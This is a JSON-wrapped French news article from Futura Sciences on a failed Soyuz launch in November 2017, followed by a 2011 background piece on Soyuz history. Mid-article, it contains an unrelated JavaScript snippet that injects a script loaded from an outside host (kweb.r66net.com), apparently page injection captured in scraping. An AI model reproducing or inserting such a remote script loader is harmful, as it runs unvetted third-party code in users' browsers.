{"title": "Un lanceur russe Soyouz rate sa mission", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "29/11/2017", "content": " La fiabilité légendaire des lanceurs russes se dégrade depuis quelques années. Hier, un lanceur Soyouz a raté sa mission et perdu les 19 satellites qu'il devait envoyer en orbite. Un échec loin d'être un cas isolé. Depuis 2010, l'Agence spatiale russe totalise un triste record avec pas moins de 19 missions ratées. Une perte de fiabilité qui tranche avec le quasi sans-faute des Russes dans l'envoi des Hommes en orbite depuis avril 1967. Hier, malgré un lancement parfait depuis le tout nouveau cosmodrome de Vostochny, situé à l'extrémité est du pays, un  lanceur russe Soyouz  a de nouveau raté sa mission, entraînant la perte de 19 satellites qui devaient être mis en  orbite  quatre heures après le lancement. Il s'agissait du deuxième vol depuis l'ouverture de ce nouveau site de lancement.  Cette fois-ci, une erreur humaine pourrait être à l'origine de l'échec. C'est du moins l'hypothèse de l'agence Interfax qui suppose qu'une mauvaise programmation de la séquence de vol de l'étage supérieur Fregat aurait provoqué une mauvaise orientation des moteurs. L'étage n'aurait pas atteint son orbite à quelques centaines de kilomètres au-dessus de la  Terre . Il serait tombé avec ses satellites dans l'océan Atlantique. Décollage du lanceur Soyouz depuis le cosmodrome de Vostochny retransmis en direct à la télévision. © Roscosmos Une série inquiétante d'échecs  Roscosmos n'a pas confirmé le récit présenté par Interfax, mais les responsables de la mission ont confirmé qu'aucun contact n'a pu être établi, que ce soit avec l' étage supérieur Fregat  ou avec les satellites. Cela dit, en raison du grand nombre de paramètres enregistrés tout au long du vol, il ne fait guère de doute que l'exploitation de ces données permettra à Roscosmos de comprendre les causes de la perte du  lanceur  et des satellites.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  S'il s'agit du premier échec de l'année pour la Russie (pour 17 lancements réussis), cela porte à 19 le nombre de tirs ratés depuis 2009, dont 4 échecs partiels, avec une  année noire en 2011  avec pas moins de cinq échecs. Hier, Roscosmos a notamment perdu un satellite russe de météorologie Meteor de la série M (passager principal) et LEO Vantage 2, un prototype de satellite de télécommunications HTS en bande Ka pour une constellation en orbite basse de la société canadienne Telesat.  Pour en savoir plus Soyouz : un demi-siècle d’expérience, et quelques difficultés… Article de Jean-Luc Goudet publié le 3 septembre 2011 Après la suspension des vols habités vers l'ISS, on s'inquiète de la fiabilité du lanceur  Soyouz . Mais la longue expérience dont il résulte plaide pour lui. Retour sur l'histoire du spatial russe, qui plonge ses racines dans l'URSS de l'après-guerre. Les récents  déboires du lanceur russe Soyouz  pointent le grand âge des technologies utilisées. Cette fusée a été en effet connu son premier lancement en 1966. Mais les techniques russes actuelles sont reconnues pour leur fiabilité et même pour une certaine rusticité. Il n'est pas inutile de jeter un  œil  dans le rétroviseur pour prendre la mesure de l'expérience accumulée. Le programme Soyouz ( union  en russe) débute en 1962. Le nom est celui d'un vaisseau spatial, une capsule, capable d'emporter deux puis trois  cosmonautes . Il est l'œuvre de Sergueï Korolev et doit alors succéder aux vaisseaux Vostok (celui de  Youri Gagarine ,  premier Homme dans l’espace  le 12 avril 1961) et Voskhod, qui n'a servi que deux fois. Un vaisseau Soyouz vole pour la première fois le 21 avril 1967 et est prévu pour permettre des rendez-vous spatiaux automatisés ou réalisés manuellement. Il faut un lanceur lourd pour le mettre en orbite et la fusée, mise au point par l'équipe de Korolev, prendra également le nom de Soyouz. Avec un premier vol le 16 novembre 1963, le programme Soyouz s’appuyait déjà sur une longue expérience de l’Union soviétique en matière spatiale, après les Spoutnik (premier satellite artificiel de la Terre le 4 octobre 1957), le vaisseau monoplace Vostok (premier Homme dans l’espace le 12 avril 1961), les Venera (premières sondes vers Vénus) et les Luna (missions inhabitées vers la Lune). Soyouz est aussi le nom du lanceur lourd. Le programme Soyouz a permis d’effectuer les premiers rendez-vous spatiaux de l’URSS puis a servi de navette pour toutes les stations spatiales (sauf Skylab et l'embryon de station chinoise) : Saliout, Mir et ISS. © Idé Graphics Toujours bon pied bon œil La longévité du vaisseau Soyouz est tout à fait remarquable. De nombreuses améliorations lui ont été apportées et plusieurs versions ont été développées au fil des années, avec ou sans panneaux solaires par exemple. Mais son architecture n'a pas changé et c'est toujours à peu près le vaisseau de 1962 qui amène les  astronautes  à bord de la  Station spatiale internationale  (ou ISS). Le cargo Progress, inhabité, qui ravitaille régulièrement l'ISS est directement dérivé du vaisseau Soyouz. Le problème actuel, qui a conduit à  suspendre les vols des Soyouz  et qui pourrait conduire à l' évacuation provisoire de l’ISS , ne concerne qu'un étage du lanceur Soyouz et pas le vaisseau spatial. Il n'en reste pas moins que ces ennuis montrent le peu d'investissements réalisés ces dernières années en Russie, et même aux États-Unis pour assurer un accès fiable à l'orbite basse. Le programme chinois de vols habités, lui, semble aller bon train, grâce notamment à l'efficacité de la capsule  Shenzhou ... directement inspirée des Soyouz. ", "theme": "sciences"}